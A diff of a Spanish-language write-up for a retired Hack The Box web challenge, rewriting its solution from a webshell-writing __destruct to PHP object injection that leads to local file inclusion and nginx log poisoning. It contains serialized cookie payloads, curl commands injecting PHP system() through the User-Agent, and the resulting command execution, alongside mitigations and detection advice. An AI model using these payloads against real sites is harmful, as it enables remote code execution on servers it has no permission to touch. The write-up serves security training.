@@ -4,7 +4,7 @@ type: Web
 difficulty: Very Easy
 platform: Hack The Box
 state: Retired
-tags: [web, php, deserialization, object-injection, magic-methods]
+tags: [web, php, deserialization, object-injection, lfi, log-poisoning]
 ---
 
 
@@ -16,27 +16,27 @@ tags: [web, php, deserialization, object-injection, magic-methods]
 
 ## TL;DR
 
-La aplicación guarda un objeto PHP **serializado en una cookie** y lo pasa por `unserialize` en cada petición. Una clase con un método mágico `__destruct` escribe un fichero cuyo nombre viene de una propiedad del objeto. Se inyecta un objeto con `logFile` apuntando a un `.php` del webroot y el `__destruct` deja un webshell.
+- La cookie `PHPSESSID` contiene un objeto PHP serializado en base64 que la aplicación pasa por `unserialize`.
+- La clase `PageModel` tiene `public $file` y un `__destruct()` que hace `include($this->file)`: inyectando el objeto se controla una inclusión de fichero (**LFI**).
+- Para convertir el LFI en RCE se envenena el log de nginx con código PHP en el `User-Agent` y se incluye `/var/log/nginx/access.log`.
 
 ## Enunciado y superficie
 
-Un sitio con una página de inicio y una cookie de sesión que cambia según la visita. No hay login ni formulario: todo el estado viaja en la cookie.
+Un sitio con una página de inicio y una cookie de sesión que cambia en cada visita. No hay login ni formulario: todo el estado del cliente viaja en la cookie, que la aplicación deserializa.
 
 ## Reconocimiento
 
-- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».
+- Inspeccionar la cookie con las DevTools: el valor es base64 que, al decodificarlo, empieza por `O:` (objeto serializado de PHP).
+- Enumerar rutas y ficheros habituales (`/index.php`, `?page=`) y comprobar que no hay otros puntos de entrada.
+- Confirmar que el servidor es nginx para elegir la ruta del log.
 
 ## Análisis del código
 
-- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».
-
-## Explicación del fallo
-
 ```php
-class Toxic {
-    public $logFile;
+class PageModel {
+    public $file;
     public function __destruct() {
-        file_put_contents($this->logFile, "<?php system(\$_GET['c']); ?>");
+        include($this->file);
     }
 }
 
@@ -47,36 +47,55 @@ if (isset($_COOKIE['PHPSESSID'])) {
 
 Dos detalles clave:
 
-1. No hay allowlist de clases: cualquier clase cargada se puede instanciar desde la cookie.
-2. El nombre del fichero no se valida, así que apunta donde queramos dentro del webroot.
+1. No hay allowlist de clases (`allowed_classes`): cualquier clase cargada se puede instanciar desde la cookie.
+2. La propiedad `$file` no se valida y se pasa a `include()` al destruirse el objeto, al final de la petición.
+
+## Explicación del fallo
+
+La vulnerabilidad es de **inyección de objetos PHP** que termina en **inclusión local de ficheros**. El `unserialize` de datos del cliente permite construir un `PageModel` con la propiedad `$file` apuntando a cualquier ruta legible por el servidor; el método mágico `__destruct` ejecuta el `include` sin comprobar origen ni extensión.
+
+Como `include` interpreta el contenido como PHP si encuentra las etiquetas, basta con que un fichero del sistema contenga código PHP controlado por el atacante: de ahí el **log poisoning**.
 
 ## Reproducción local
 
-- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.
+- Levantar un PHP + nginx con la misma clase y un log escribible por el usuario del servicio, y apuntar el exploit a `127.0.0.1`.
+- Comprobar primero el LFI con `/etc/passwd` antes de intentar el veneno.
 
 ## Explotación
 
-Se construye el objeto con el mismo nombre de clase y la propiedad pública:
+1. Comprobar el LFI incluyendo `/etc/passwd`:
 
 ```php
-O:5:"Toxic":1:{s:7:"logFile";s:9:"shell.php";}
+O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}
 ```
-
-Se codifica en base64 y se envía en la cookie:
 
 ```bash
-PAYLOAD=$(printf 'O:5:"Toxic":1:{s:7:"logFile";s:9:"shell.php";}' | base64 -w0)
+PAYLOAD=$(printf 'O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}' | base64 -w0)
 curl -s -b "PHPSESSID=$PAYLOAD" http://<IP>:<puerto>/
-curl -s "http://<IP>:<puerto>/shell.php?c=id"
 ```
 
-La primera petición destruye el objeto al terminar el script y escribe `shell.php`; la segunda ejecuta comandos.
+2. Envenenar el log de nginx con una petición cuyo `User-Agent` sea código PHP:
+
+```bash
+curl -s -A '<?php system($_GET["c"]); ?>' http://<IP>:<puerto>/
+```
+
+3. Incluir el log y ejecutar comandos con `?c=`:
+
+```php
+O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
+```
+
+```bash
+PAYLOAD=$(printf 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}' | base64 -w0)
+curl -s -b "PHPSESSID=$PAYLOAD" "http://<IP>:<puerto>/?c=id"
+```
 
 ```text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Con `c=cat /flag*` aparece la flag.
+Con `?c=cat /flag*` aparece la flag.
 
 ## Evidencia
 
@@ -85,19 +104,20 @@ Con `c=cat /flag*` aparece la flag.
 
 ## Lecciones aprendidas
 
-- **Longitud de la propiedad**: `s:7:"logFile"` cuenta exactamente los caracteres; un byte de más rompe la deserialización y la cookie se ignora en silencio.
+- **Longitud de la propiedad**: `s:4:"file"` y `s:11:"/etc/passwd"` cuentan caracteres exactos (incluido el `/`); un byte de más rompe la deserialización y la cookie se ignora en silencio.
 - **Base64 con saltos de línea**: usar `-w0` para que la cookie no se corte.
-- **Ruta del webroot**: si `/var/www/html` no es escribible, probar `uploads/` o un subdirectorio con permisos.
-
-- `unserialize` sobre datos del cliente es ejecución de código a través de métodos mágicos, no solo lectura de datos.
-- `__destruct`, `__wakeup` y `__toString` son los ganchos habituales de la inyección de objetos PHP.
-- Mitigación: `json_decode` para estado del cliente, `allowed_classes => false` y nombres de fichero generados por el servidor.
+- **Ruta del log**: depende del servidor (`/var/log/nginx/access.log`, `/var/log/apache2/access.log`); si no se puede leer, probar `/proc/self/environ` o ficheros de sesión.
+- **`unserialize` sobre datos del cliente** es ejecución de código a través de métodos mágicos, no solo lectura de datos.
+- Mitigación: `json_decode` para el estado del cliente, `allowed_classes => false` y listas blancas de ficheros incluidos.
 
 ## Mitigaciones y detección
 
-- Aplicar la corrección de la categoría: validación en servidor, versiones parcheadas y mínimo privilegio.
-- Detección: revisar los logs de la aplicación y alertar de 4xx/5xx repetidos o entradas anómalas.
+- No deserializar datos del cliente; si es imprescindible, `allowed_classes => false` y firma/HMAC del estado.
+- Sustituir `include($file)` por una lista blanca de plantillas y rechazar rutas absolutas o `..`.
+- Detección: valores de cookie que decodifican a objetos PHP, `include` de rutas de log y `User-Agent` con etiquetas `<?php`.
 
 ## Referencias
 
-- [rop-stack](../../knowledge/pwn/rop-stack.md)
+- [OWASP: PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
+- [MITRE T1190](https://attack.mitre.org/techniques/T1190/)
+- [PayloadsAllTheThings: File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
